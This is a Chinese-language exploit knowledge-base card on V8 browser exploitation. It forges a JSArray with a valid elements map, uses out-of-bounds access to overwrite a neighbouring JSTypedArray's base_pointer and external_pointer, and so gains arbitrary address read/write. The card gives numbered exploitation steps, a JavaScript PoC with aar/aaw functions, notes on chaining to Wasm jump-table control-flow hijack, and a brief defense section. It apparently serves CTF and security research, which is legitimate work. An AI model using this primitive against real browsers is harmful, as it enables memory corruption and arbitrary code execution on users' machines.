---
id: binary-pwn-browser-v8-fake-array-jstypedarray-dataptr-aar-aaw
title: V8 新版 elements map 校验下：新 fake_array 越界改写 JSTypedArray 的 base/external_pointer，控制 data_ptr 实现 AAR/AAW
type: scenario
domain: binary
path: binary/pwn/browser
technique: fake-array-overwrite-jstypedarray-dataptr-aar-aaw
tags:
- binary
- pwn
- browser
- v8
- jstypedarray
- fake-array
- aar-aaw
- pointer-compression
- oob
- wasm
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-T1-4
  verified_at: '2026-11-07T21:42:15+08:00'
  notes: 已对照原文及 20 张图核对；图09 base_pointer 被改写为 0x41414141、图10 leak 0x3ff1999999999a 且 aaw 把数组元素改为 0x41414141，AAR/AAW 原语有调试验证已打通，非未打通/理论链；图01/03 的 CHECK Fatal error 是旧 fake_array 失效背景非本卡危害；dedup 除自身外无同链候选，dedup_review 成立；V8 通用利用手法非组件漏洞，原文 d8 13.5.0 仅为测试环境非受影响版本区间，不设 affected_versions；路径 binary/pwn/browser 合法、无 CVE(通用手法合理)、frontmatter 无 sources 违规字段；未验证点：假设已有 addrOf/fakeObj 且去除 Sandbox，非针对具体漏洞的完整 RCE，堆布局偏移(0x6C/0x20)需按环境实测，未独立复现
url: /docs/binary/pwn/browser/binary-pwn-browser-v8-fake-array-jstypedarray-dataptr-aar-aaw/
draft: false
kb_aliases:
- 新版 fake_array 构造
- JSTypedArray data_ptr 劫持
- base_pointer / external_pointer 覆盖
- V8 任意地址读写原语
- AAR/AAW via TypedArray
- 伪造 doubleArray 与 elements
---

## 一句话结论

在较新 V8（DEBUG/VERIFY_HEAP 开启，`GetElementsKind` 会校验 elements 的 map）中，把 elements 直接指向 `target_addr-0x8` 的传统 fake_array 会触发 CHECK 崩溃；改用"先伪造一个带合法 map/length 的 doubleArray + elements 结构、再借越界读写改写邻近 JSTypedArray 对象内的 `base_pointer`/`external_pointer`"即可控制 `data_ptr = base_pointer + external_pointer`，通过 TypedArray 自身索引实现任意地址读写，且不受目标地址 elements 结构校验限制。

## 原理

- **旧方法为何失效**：`/src/objects/js-objects-inl.h` 的 `JSObject::GetElementsKind` 在 `VERIFY_HEAP && DEBUG` 下取 JSArray 的 `elements_kind()`，再按类型 CHECK elements 对象的 map：double 类型要求 `IsFixedDoubleArray(fixed_array)` 或指向 `empty_fixed_array`，否则报 `Fatal error ... Check failed: IsFixedDoubleArray(fixed_array, cage_base) || fixed_array == GetReadOnlyRoots().empty_fixed_array()`。传统 fake_array 把 elements 指向 `target_addr-0x8`（elements 头部为 32bit map + 32bit length，数据从 `+0x8` 起），目标地址通常没有合法的 `fixed_array_map`，因此赋值时崩溃。
- **换一个可控目标**：`JSTypedArray`（如 `Float64Array`）的 `data_ptr` 决定真实数据内存，`data_ptr = base_pointer + external_pointer`。两个字段直接存放在对象内存里：`external_pointer` 在偏移 `0x30`（8 字节）、`base_pointer` 在偏移 `0x38`（4 字节堆内压缩指针）。小容量 TypedArray 用内联存储（数据放在 elements 里，backing_store 为空），大容量则走 external。关键是 `data_ptr` 直接指向数据存储区，**读写时不再校验目标地址有没有合法的 elements 结构**，绕开了上面的 CHECK。
- **怎么改到这两个字段**：先用 `addrof()`/`fakeobj()` 构造一个"完整伪造"的 fake doubleArray（含 map、properties、elements、length）与紧随其后的 fake elements（含 elements_map、elements_length、一个 float 占位），让 fake doubleArray 的 elements 索引到 fake elements 对象，得到一个大 length、能越界读写的 `fake_obj`。再在附近堆上创建 `JSTypedArray`，用 `(js_typed_array_addr - fake_obj_addr + 0x20) / 8` 算出 `base_pointer` 所在的越界下标，通过 `fake_obj[idx]` 直接改写该字段。
- **为什么能拿到 AAR/AAW**：把 `base_pointer` 的低 32 位改成 `addr - 7`（保留高 32 位、处理指针压缩标志位），`data_ptr` 随之指向 `addr`，`js_typed_array[0]` 的读/写即变成对该地址的读/写。若要原始指针范围的任意地址读写，清空 `base_pointer`、把 `external_pointer`（偏移 `0x30`）整体覆盖为 64 位目标地址即可。
- **完整性**：文章给出了完整可复现的 JS 模板并给出 `leak: 0x...` 与 `aaw(...)` 的验证截图，属于已打通的完整原语；前提是已具备 `addrof()`/`fakeobj()` 与可控的内存损坏（本文不探讨如何获得这些前置原语、也不涉及 Sandbox Escape）。

## 触发条件

- 已通过 V8 漏洞/CTF patch 构造出 `addrof()` 与 `fakeobj()` 原语，并有可控的越界/任意写能力。
- 目标 V8 在 DEBUG/VERIFY_HEAP 下启用了 `GetElementsKind` 的 elements map 校验（使得传统 fake_array 不可用），或需要一个不依赖目标地址结构的更通用读写原语。
- 测试环境为去除 Sandbox（或已完成沙盒逃逸），使 `external_pointer` 是原始 64 位指针；开启 Sandbox 时该字段是左移 24 位的编码指针。
- 能在伪造对象附近创建 `JSTypedArray` 并借 `%DebugPrint()` 确定堆布局偏移（如 `0x6C`/`0x20`），偏移随堆布局变化需实测。

## 利用步骤

1. 用 `u2f()` 拼出 fake_array：`[map|properties, elements占位|length(0x1000), elements_map|elements_length, 6.6]`，其中 map/elements_map 取现有 doubleArray / FixedDoubleArray 的固定压缩指针。
2. `addrof(fake_array)` 得到地址，`fake_obj_addr = fake_array_addr + 0x6C`（按实测调整）；把 `fake_array[1]` 的 elements 覆盖为 `fake_obj_addr + 0x10`，再用 `fakeobj(fake_obj_addr)` 得到可越界的 `fake_obj`。
3. 在其后创建 `let js_typed_array = new Float64Array(1)`，`addrof` 取地址，计算 `base_pointer_offset = (js_typed_array_addr - fake_obj_addr + 0x20n) / 8n`。
4. 用 `fake_obj[base_pointer_offset]` 保留高 32 位、把低 32 位改成目标地址（`addr & 1n` 时先减 1，再减 7 以对齐 elements 头），封装成 `aar(addr)` / `aaw(addr, value)`，通过 `js_typed_array[0]` 完成读写。
5. 需要跨出堆范围时，先清空 `base_pointer`，再对 `external_pointer_offset` 写入完整 64 位地址，得到原始指针范围的 AAR/AAW。
6. 该 AAR/AAW 作为后续控制流劫持（如篡改 Wasm 对象 jump_table_start）的读写基础。

## PoC

```javascript
// 前置：已有 addrof()/fakeobj()/i2f()/f2i()/u2f()/i2u_l()
let fake_array = [
  u2f(0x001882fd, 0x00000745), // map, properties
  u2f(0x41414141, 0x00001000), // elements 占位, length
  u2f(0x000008a1, 0x00001000), // elements_map, elements_length
  6.6,
];
let fake_array_addr = addrof(fake_array);
let fake_obj_addr = fake_array_addr + 0x6Cn;   // 偏移按堆布局实测
fake_array[1] = u2f(i2u_l(fake_obj_addr + 0x10n), 0x00001000);
let fake_obj = fakeobj(fake_obj_addr);

let js_typed_array = new Float64Array(1);
let base_pointer_offset = (addrof(js_typed_array) - fake_obj_addr + 0x20n) / 8n;

function aaw(addr, value) {
  if (addr & 1n) addr -= 1n;
  addr -= 7n;
  let temp = f2i(fake_obj[base_pointer_offset]);
  fake_obj[base_pointer_offset] = i2f((temp & 0xffff_ffff_0000_0000n) + addr);
  js_typed_array[0] = i2f(value);
}
function aar(addr) { /* 同上，最后 return js_typed_array[0]; */ }
```

验证：`let a=[1.1,2.2,3.3]; let e=addrof(a)+0x18n; aar(e+0x8n)` 可泄漏元素值，`aaw(e+0x8n, 0x41414141n)` 可改元素。原始指针范围版本把 `base_pointer` 清零并改写 `external_pointer` 为 64 位地址即可。

## 变体与关联

- **Sandbox 下的边界（未打通，confidence 低）**：开启 Sandbox 时 `external_pointer` 存的是左移 24 位的编码指针，`data_ptr = (external_pointer >> 24) + base_pointer + Sandbox.base`。文中提到若把 `external_pointer=0xFFFF_FFFF_FF00_0000`、`base_pointer=0xFFFF_FFFF`，两者相加溢出为 `0x0100_FFFF_FFFE`，存在小范围堆外越界可能；作者仅作推测，未验证可利用，不单独成卡。
- **关联**：`data_ptr` 思路与"改写 ArrayBuffer/DataView 的 backing store 指针"同源；与 WasmTrustedInstanceData.jump_table_start 覆盖配合可完成控制流劫持（见 [[binary-pwn-browser-v8-wasm-lazycompile-jump-table-start-control-flow-hijack]]）。
- **前置**：`addrof()`/`fakeobj()` 的构造依赖具体漏洞类型（类型混淆、OOB、沙盒逃逸 issue 等），因题而异，不在本卡范围。

## 检测与防御

- **工程侧**：`VERIFY_HEAP`/DEBUG 下的 elements map CHECK 本身就是一道缓解（本卡正是绕过它）；生产构建还应保留对 TypedArray `data_ptr` 来源字段的完整性/范围校验。
- **Sandbox**：指针压缩 + 沙盒把 `external_pointer` 编码为相对 Sandbox.base 的偏移，阻止直接写入 64 位原始指针；应确保编码值不会溢出到堆外可访问范围。
- **内存防护**：W^X（JIT/RWX 分离）、CFI/CET、堆布局随机化与 TypedArray 对象隔离，提高伪造与越界改写门槛。
- **检测**：监控 TypedArray 的 `base_pointer`/`external_pointer` 被异常改写、指向非堆/非 backing_store 地址，以及大量 `%DebugPrint`/调试接口使用；对渲染进程做崩溃与异常指针访问遥测。
